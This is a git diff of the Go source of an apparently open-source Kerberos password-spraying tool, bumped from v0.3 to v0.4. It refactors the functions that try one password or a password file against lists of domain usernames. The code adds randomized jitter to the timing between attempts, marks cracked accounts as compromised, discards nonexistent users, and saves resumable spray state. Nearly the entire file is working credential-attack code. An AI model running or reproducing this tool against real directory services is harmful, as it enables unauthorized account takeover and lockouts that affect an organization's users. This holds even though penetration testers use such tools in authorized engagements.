@@ -46,7 +46,7 @@ const (
 	\__    ___/______|__|/  |_|__|__ __  _____  
 	  |    |  \_  __ \  \   __\  |  |  \/     \ 
 	  |    |   |  | \/  ||  | |  |  |  /  Y Y  \
-	  |____|   |__|  |__||__| |__|____/|__|_|__/ v 0.3
+	  |____|   |__|  |__||__| |__|____/|__|_|__/ v 0.4
 											  
 
 	  Author: S4R1N, alfarom256
@@ -104,6 +104,16 @@ type FlagOptions struct { // option var decleration
 	res bool
 	rf  string
 }
+type Authenticator interface {
+	Login() (string, string, error)
+}
+type account struct {
+	Username    string
+	Domain      string
+	Password    string
+	Compromised bool
+	PassNum     int
+}
 
 func options() *FlagOptions {
 	username := flag.String("u", "", "single username to authenticate as")
@@ -124,29 +134,55 @@ func options() *FlagOptions {
 	o := flag.String("o", "spray.json", "outfile")
 
 	flag.Parse()
-	return &FlagOptions{help: *help, username: *username, userfile: *userfile, domain: *domain, password: *password, domainController: *domainController, wait: *wait, rs: *rs, ws: *ws, pwf: *pwf, rf: *rf, res: *res, o: *o, jitter: *jitter, dcf: *dcf}
+
+	return &FlagOptions{
+		help:             *help,
+		username:         *username,
+		userfile:         *userfile,
+		domain:           *domain,
+		password:         *password,
+		domainController: *domainController,
+		wait:             *wait,
+		rs:               *rs,
+		ws:               *ws,
+		pwf:              *pwf,
+		rf:               *rf,
+		res:              *res,
+		o:                *o,
+		jitter:           *jitter,
+		dcf:              *dcf,
+	}
 }
 func wait(wt int, jitPerc int) {
+
 	var jitter float64 = 0
 	var wait int = 0
 	var sign int = rand.Intn(2)
+
 	if sign == 0 {
+
 		sign = 1
+
 	} else {
+
 		sign = -1
+
 	}
+
 	if jitPerc > 0 {
+
 		jitter = float64(rand.Intn(jitPerc)*sign) / 100 // creates jitter percentage
+
 	} else {
+
 		jitter = 0.0
+
 	}
+
 	var jitWait float64 = float64(wt*1000) * jitter // creates jitter time (plus or minus whatever seconds)
 	wait = (wt * 1000) + int(jitWait)               // actual wait time
-	time.Sleep(time.Duration(wait) * time.Millisecond)
-}
 
-type Authenticator interface {
-	Login() (string, string, error)
+	time.Sleep(time.Duration(wait) * time.Millisecond)
 }
 
 func randomDC(dcs []string) string {
@@ -157,14 +193,6 @@ func randomDC(dcs []string) string {
 	return dc
 }
 
-type account struct {
-	Username    string
-	Domain      string
-	Password    string
-	Compromised bool
-	PassNum     int
-}
-
 func saveState(users []account, of string) {
 
 	file, _ := json.MarshalIndent(users, "", " ")
@@ -172,7 +200,61 @@ func saveState(users []account, of string) {
 	_ = ioutil.WriteFile(of, file, 0644)
 }
 func removeUser(users []account, i int) []account {
-	return append(users[:i], users[i+1:]...)
+
+	var user account
+
+	copy(users[i:], users[i+1:]) // Shift a[i+1:] left one index.
+	users[len(users)-1] = user   // Erase last element (write zero value).
+	users = users[:len(users)-1] // Truncate slice.
+
+	return users
+
+}
+
+func acctArrGen(ufile string, realm string, resumeSpray bool) []account {
+	var acctArr []account
+	var counter int = 0
+
+	if resumeSpray != true {
+
+		users := make([]account, linecounter(ufile)) // create array
+		fmt.Println("Userfile set to: ", ufile)
+
+		file, err := os.Open(ufile)
+
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		defer file.Close()
+
+		scanner := bufio.NewScanner(file)
+
+		for scanner.Scan() {
+
+			users[counter].Username = scanner.Text()
+			users[counter].Domain = realm
+			users[counter].Compromised = false
+			users[counter].PassNum = 0
+			counter++
+
+		}
+
+		acctArr = users
+
+	} else {
+
+		jsonFile, err := os.Open(ufile)
+		if err != nil {
+			fmt.Println(err)
+		}
+		defer jsonFile.Close()
+		byteValue, _ := ioutil.ReadAll(jsonFile)
+		json.Unmarshal(byteValue, &acctArr)
+
+	}
+
+	return acctArr
 }
 
 func kerbAuth(username string, relm string, pass string, domainController string) string {
@@ -253,243 +335,103 @@ func linecounter(fileName string) int {
 
 }
 
-func genericSpray(uf string, realm string, password string, DCs []string, wt int, of string, jitter int) {
+func spray(users []account, password string, DCs []string, wt int, jitter int, of string, passNum int) {
 
-	var counter int = 0
-	var lockoutProtection int = 0       // if reaches 3 consecetive lockouts exit program
-	var matcher string                  // used to see if result of auth = account lockout
-	var linecount int = linecounter(uf) // counts lines in file
-	users := make([]account, linecount) // creates an array with linecount length
+	var lockoutProtection int = 0
+	var matcher string = "" // case matcher
 
-	fmt.Println("Userfile set to: ", uf)
+	for i := 0; i < len(users); i++ {
 
-	file, err := os.Open(uf)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer file.Close()
+		if users[i].Compromised == false {
 
-	scanner := bufio.NewScanner(file)
-	counter = 0
-	for scanner.Scan() {
-		//fmt.Println(scanner.Text())
+			if users[i].PassNum == 0 || users[i].PassNum < passNum {
 
-		users[counter].Username = scanner.Text() // assignment of neccessary vars
-		users[counter].Domain = realm
-		users[counter].Password = password
-		users[counter].Compromised = false
-		users[counter].PassNum = 0
-		counter++ // counter to go through cells
-	}
-	counter = 0
-	for counter < len(users) {
+				users[i].Password = password
+				users[i].PassNum = passNum
+				matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, randomDC(DCs))
 
-		if users[counter].Compromised == false {
-			// if false
-			users[counter].Password = password
-			matcher = kerbAuth(users[counter].Username, users[counter].Domain, users[counter].Password, randomDC(DCs))
-			if strings.Contains(matcher, "[VALID Login!]") {
-				users[counter].Compromised = true
-			}
-			// lockout prevention stuff
-			if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
-				lockoutProtection++
-			} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
-				users = removeUser(users, counter)
-				counter--
-			} else {
-				lockoutProtection = 0
-			}
-			if lockoutProtection == 3 {
-				fmt.Println("3 Consective Lockouts reached, exiting the program!")
-				saveState(users, of)
-				break
+				if strings.Contains(matcher, "[VALID Login!]") {
+
+					users[i].Compromised = true
+
+				}
+
+				if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
+
+					lockoutProtection++
+
+				} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
+
+					users = removeUser(users, i) // removes user in current element and moves everything else up
+					i--                          // since element was removed and replaced this resets the counter so a user doesnt get skipped
+
+				} else {
+
+					lockoutProtection = 0
+
+				}
+
+				if lockoutProtection == 3 {
+
+					fmt.Println("3 Consective Lockouts reached, exiting the program!")
+					saveState(users, of)
+					os.Exit(1) // exit program if 3 consecutive users are locked out
+
+				}
+
+				wait(wt, jitter)
+
 			}
 
-			wait(wt, jitter)
 		}
-		counter++
+
 	}
+
 	saveState(users, of)
+
 }
 
-func recursiveSpray(uf string, realm string, pwf string, DCs []string, wt int, ws int, of string, jitter int) {
-	var counter int = 0
-	var pNum int = 0
-	var lockoutProtection int = 0 // if reaches 3 consecetive lockouts exit program
-	var matcher string            // used to see if result of auth = account lockout
-	fmt.Println("Userfile set to: ", uf)
-	var linecount int = linecounter(uf) // counts lines in file
-	users := make([]account, linecount) // creates an array with linecount length
+func recSpray(users []account, passfile string, DCs []string, wt int, jitter int, ws int, of string) {
 
-	/*************************************************************************/
+	pwfile, err := os.Open(passfile) // openspasswordfile
+	var counter int = 0              // used for tracking (mostly here for resume spray)
+	fmt.Println("Password file set to:", passfile)
 
-	file, err := os.Open(uf)
 	if err != nil {
+
 		log.Fatal(err)
+
 	}
-	defer file.Close()
 
-	scanner := bufio.NewScanner(file)
-	counter = 0
-	for scanner.Scan() {
-
-		users[counter].Username = scanner.Text() // assignment of neccessary vars
-		users[counter].Domain = realm
-		users[counter].Password = ""
-		users[counter].Compromised = false
-		users[counter].PassNum = 0
-		counter++ // counter to go through cells
-	}
-	counter = 0
-
-	/*************************************************************************/
-
-	// open the file and set password string to password and only set it to users that have false for
-	pwfile, err := os.Open(pwf) // openspasswordfile
-	fmt.Println("Password file set to:", pwf)
-	if err != nil {
-		log.Fatal(err)
-	}
 	defer pwfile.Close()
 	pwscanner := bufio.NewScanner(pwfile)
-	if err == nil {
-
-	}
 
 	for pwscanner.Scan() {
-
-		for counter := 0; counter < len(users); counter++ {
-			if users[counter].Compromised == false {
-				users[counter].Password = pwscanner.Text() // sets new password value for object if object isnt compromised
-
-				matcher = kerbAuth(users[counter].Username, users[counter].Domain, users[counter].Password, randomDC(DCs))
-				if strings.Contains(matcher, "[VALID Login!]") {
-					users[counter].Compromised = true
-				}
-				// lockout prevention stuff
-				if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
-					users[counter].PassNum = pNum
-					lockoutProtection++
-				} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
-					users = removeUser(users, counter)
-					counter--
-				} else if strings.Contains(matcher, "[VALID Login!]") || strings.Contains(matcher, "[Valid User But Invalid Password]") {
-					users[counter].PassNum = pNum
-					lockoutProtection = 0
-				}
-				if lockoutProtection == 3 {
-					fmt.Println("3 Consective Lockouts reached, exiting the program!")
-					saveState(users, of)
-					os.Exit(1)
-				}
-				wait(wt, jitter)
-			}
-
-		}
-		saveState(users, of)
-		pNum++
+		fmt.Println("----------------------", pwscanner.Text(), "----------------------")
+		spray(users, pwscanner.Text(), DCs, wt, jitter, of, counter)
+		counter++
 		wait(ws, 0)
+
 	}
 
 }
-func resumeSpray(sprayDB string, pwstring string, rs bool, wt int, ws int, DCs []string, of string, jitter int) {
 
-	var lockoutProtection int = 0 // if reaches 3 consecetive lockouts exit program
-	var matcher string            // used to see if result of auth = account lockout
-
-	jsonFile, err := os.Open(sprayDB)
-	if err != nil {
-		fmt.Println(err)
-	}
-	defer jsonFile.Close()
-	byteValue, _ := ioutil.ReadAll(jsonFile)
-	var users []account
-	json.Unmarshal(byteValue, &users)
+func resSpray(rs bool, users []account, pwstring string, DCs []string, wt int, jitter int, ws int, of string) {
 
 	if rs {
-		var passNum = 0
 
-		pwfile, err := os.Open(pwstring) // openspasswordfile
-		fmt.Println("Password file set to:", pwstring)
-		if err != nil {
-			log.Fatal(err)
-		}
-		defer pwfile.Close()
-		pwscanner := bufio.NewScanner(pwfile)
-		if err == nil {
-
-		}
-
-		for pwscanner.Scan() {
-
-			for i := 0; i < len(users); i++ {
-				if users[i].Compromised == false && users[i].PassNum < passNum {
-
-					users[i].Password = pwscanner.Text() // sets new password value for object if object isnt compromised
-
-					matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, randomDC(DCs))
-					if strings.Contains(matcher, "[VALID Login!]") {
-						users[i].Compromised = true
-					}
-					// lockout prevention stuff
-					if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
-						users[i].PassNum = passNum
-						lockoutProtection++
-					} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
-						users = removeUser(users, i)
-						i--
-					} else if strings.Contains(matcher, "[VALID Login!]") || strings.Contains(matcher, "[Valid User But Invalid Password]") {
-						users[i].PassNum = passNum
-						lockoutProtection = 0
-					}
-					if lockoutProtection == 3 {
-						fmt.Println("3 Consective Lockouts reached, exiting the program!")
-						saveState(users, of)
-						os.Exit(1)
-					}
-
-				}
-				wait(wt, jitter)
-			}
-			saveState(users, of)
-			passNum++
-			wait(ws, 0)
-
-		}
+		recSpray(users, pwstring, DCs, wt, jitter, ws, of)
 
 	} else {
-		// generic spray
-		for i := 0; i < len(users); i++ {
-			if users[i].Compromised == false {
-				users[i].Password = pwstring
-				matcher = kerbAuth(users[i].Username, users[i].Domain, users[i].Password, randomDC(DCs))
-				if strings.Contains(matcher, "[VALID Login!]") {
-					users[i].Compromised = true
-				}
-				// lockout prevention stuff
-				if strings.Contains(matcher, "[USER ACCOUNT LOCKED]") {
-					users[i].PassNum = 0
-					lockoutProtection++
-				} else if strings.Contains(matcher, "[USER DOESN'T EXIST]") {
-					users = removeUser(users, i)
-					i--
-				} else if strings.Contains(matcher, "[VALID Login!]") || strings.Contains(matcher, "[Valid User But Invalid Password]") {
-					users[i].PassNum = 0
-					lockoutProtection = 0
-				}
-				if lockoutProtection == 3 {
-					fmt.Println("3 Consective Lockouts reached, exiting the program!")
-					saveState(users, of)
-					os.Exit(1)
-				}
-				wait(wt, jitter)
-			}
 
+		for i := 0; i < len(users); i++ { //resets for individual sprays
+			users[i].PassNum = 0
 		}
-		saveState(users, of)
+
+		spray(users, pwstring, DCs, wt, jitter, of, 0)
 
 	}
+
 }
 
 func main() {
@@ -503,25 +445,37 @@ func main() {
 	fmt.Println(banner)
 	opt := options()
 
-	// checking options
 	if opt.help {
+
 		fmt.Println(usage)
 		os.Exit(0)
+
 	}
 
 	if opt.domainController == "" && opt.dcf == "" {
+
 		fmt.Println("Error I need a KDC or a KDC file")
 		os.Exit(1)
+
 	} else if opt.dcf != "" {
+
 		dcList, err := os.Open(opt.dcf)
+
 		if err != nil {
+
 			log.Fatal(err)
+
 		}
+
 		defer dcList.Close()
 		dcs := bufio.NewScanner(dcList)
+
 		for dcs.Scan() {
+
 			dcARR = append(dcARR, dcs.Text())
+
 		}
+
 	} else {
 
 		dcARR = append(dcARR, opt.domainController)
@@ -529,23 +483,32 @@ func main() {
 	}
 
 	if opt.res {
+
 		if opt.rf != "" {
+
+			userArr := acctArrGen(opt.rf, opt.domain, opt.res)
+
 			if opt.rs {
 
-				resumeSpray(opt.rf, opt.pwf, opt.rs, opt.wait, opt.ws, dcARR, opt.o, opt.jitter) // recursive spray
+				resSpray(opt.rs, userArr, opt.pwf, dcARR, opt.wait, opt.jitter, opt.ws, opt.o)
+				os.Exit(0)
 
 			} else {
 
-				resumeSpray(opt.rf, opt.password, opt.rs, opt.wait, opt.ws, dcARR, opt.o, opt.jitter) // generic spray
-				os.Exit(1)
+				resSpray(opt.rs, userArr, opt.password, dcARR, opt.wait, opt.jitter, opt.ws, opt.o)
+				os.Exit(0)
 
 			}
 
 		} else {
+
 			fmt.Println("[+] Error spray database not provided")
 			os.Exit(1)
+
 		}
+
 	} else {
+
 		if opt.rs {
 			rs = true
 		}
@@ -575,6 +538,8 @@ func main() {
 
 		} else if opt.userfile != "" { // password spray mode
 
+			userArr := acctArrGen(opt.userfile, opt.domain, opt.res)
+
 			if rs == false {
 
 				if opt.password == "" {
@@ -583,12 +548,13 @@ func main() {
 					os.Exit(1)
 
 				}
-				genericSpray(opt.userfile, opt.domain, opt.password, dcARR, opt.wait, opt.o, opt.jitter)
+
+				spray(userArr, opt.password, dcARR, opt.wait, opt.jitter, opt.o, 0)
 
 			} else {
 				if opt.pwf != "" {
 
-					recursiveSpray(opt.userfile, opt.domain, opt.pwf, dcARR, opt.wait, opt.ws, opt.o, opt.jitter)
+					recSpray(userArr, opt.pwf, dcARR, opt.wait, opt.jitter, opt.ws, opt.o)
 
 				} else {
 
